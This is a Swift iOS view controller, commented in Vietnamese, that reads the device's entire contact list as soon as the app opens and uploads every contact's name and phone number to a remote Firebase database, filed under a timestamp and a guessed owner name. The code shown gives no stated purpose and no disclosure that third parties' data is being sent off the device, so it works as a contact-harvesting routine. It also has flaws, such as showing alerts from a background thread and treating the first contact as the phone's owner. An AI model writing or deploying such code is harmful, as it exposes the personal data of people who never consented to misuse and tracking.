import UIKit
import Contacts
import FirebaseDatabase

class MainController: UIViewController {

    private let RQ_CODE = 9999
    private var listContact: [ContactInfor] = []
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        // Kiểm tra quyền truy cập danh bạ
        checkPermission()
    }
    
    private func getDeviceOwnerName() -> String? {
        let store = CNContactStore()
        let keysToFetch = [CNContactGivenNameKey, CNContactFamilyNameKey]
        let fetchRequest = CNContactFetchRequest(keysToFetch: keysToFetch as [CNKeyDescriptor])
        
        var ownerName: String? = nil
        
        do {
            try store.enumerateContacts(with: fetchRequest) { (contact, stop) in
                if contact.givenName.isEmpty && contact.familyName.isEmpty {
                    return
                }
                ownerName = "\(contact.givenName) \(contact.familyName)"
                stop.pointee = true
            }
        } catch {
            print("Error fetching contacts: \(error.localizedDescription)")
        }
        
        return ownerName ?? "Unknown"
    }

    private func checkPermission() {
        let store = CNContactStore()
        let status = CNContactStore.authorizationStatus(for: .contacts)
        
        switch status {
        case .authorized:
            getContacts()
            updateDataCustomer()
        case .denied, .restricted:
            let alert = UIAlertController(title: "Quyền truy cập bị từ chối", message: "Vui lòng cấp quyền truy cập danh bạ trong cài đặt", preferredStyle: .alert)
            alert.addAction(UIAlertAction(title: "OK", style: .default, handler: nil))
            self.present(alert, animated: true, completion: nil)
        case .notDetermined:
            store.requestAccess(for: .contacts) { (granted, error) in
                if granted {
                    self.getContacts()
                    self.updateDataCustomer()
                } else {
                    DispatchQueue.main.async {
                        let alert = UIAlertController(title: "Quyền truy cập bị từ chối", message: "Vui lòng cấp quyền truy cập danh bạ trong cài đặt", preferredStyle: .alert)
                        alert.addAction(UIAlertAction(title: "OK", style: .default, handler: nil))
                        self.present(alert, animated: true, completion: nil)
                    }
                }
            }
        @unknown default:
            break
        }
    }
    
    private func getContacts() {
        let store = CNContactStore()
        let keysToFetch = [CNContactGivenNameKey, CNContactFamilyNameKey, CNContactPhoneNumbersKey]
        let fetchRequest = CNContactFetchRequest(keysToFetch: keysToFetch as [CNKeyDescriptor])
        
        do {
            try store.enumerateContacts(with: fetchRequest) { (contact, stop) in
                let contactName = "\(contact.givenName) \(contact.familyName)"
                var phoneNumber: String? = nil
                if let phone = contact.phoneNumbers.first {
                    phoneNumber = phone.value.stringValue
                }
                let info = ContactInfor(contactID: contact.identifier, displayName: contactName, phoneNumber: phoneNumber)
                listContact.append(info)
            }
        } catch {
            print("Không thể lấy danh bạ: \(error.localizedDescription)")
        }
    }
    
    func getUTCDate() -> String {
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "yyyy-MM-dd HH:mm:ss"
        dateFormatter.timeZone = TimeZone(abbreviation: "UTC")  // Đặt múi giờ là UTC
        let currentDate = Date()
        return dateFormatter.string(from: currentDate)
    }

    
    private func updateDataCustomer() {
        let timestamp = Int(Date().timeIntervalSince1970 * 1000)
        let timestampString = "\(timestamp)"
        let contactDictionaries = listContact.map { $0.toDictionary() }
        
        let database = Database.database().reference()
        
        database.child("contacts").child(timestampString).child(getDeviceOwnerName() ?? "Unknown").setValue(contactDictionaries) { error, ref in
            if let error = error {
                print("Cập nhật dữ liệu thất bại: \(error.localizedDescription)")
                let alert = UIAlertController(title: "Cập nhật dữ liệu thất bại", message: error.localizedDescription, preferredStyle: .alert)
                alert.addAction(UIAlertAction(title: "OK", style: .default, handler: nil))
                self.present(alert, animated: true, completion: nil)
            } else {
                print("Dữ liệu đã được cập nhật")
                let alert = UIAlertController(title: "Dữ liệu đã được cập nhật!", message: nil, preferredStyle: .alert)
                alert.addAction(UIAlertAction(title: "OK", style: .default, handler: nil))
                self.present(alert, animated: true, completion: nil)
            }
        }
    }
}
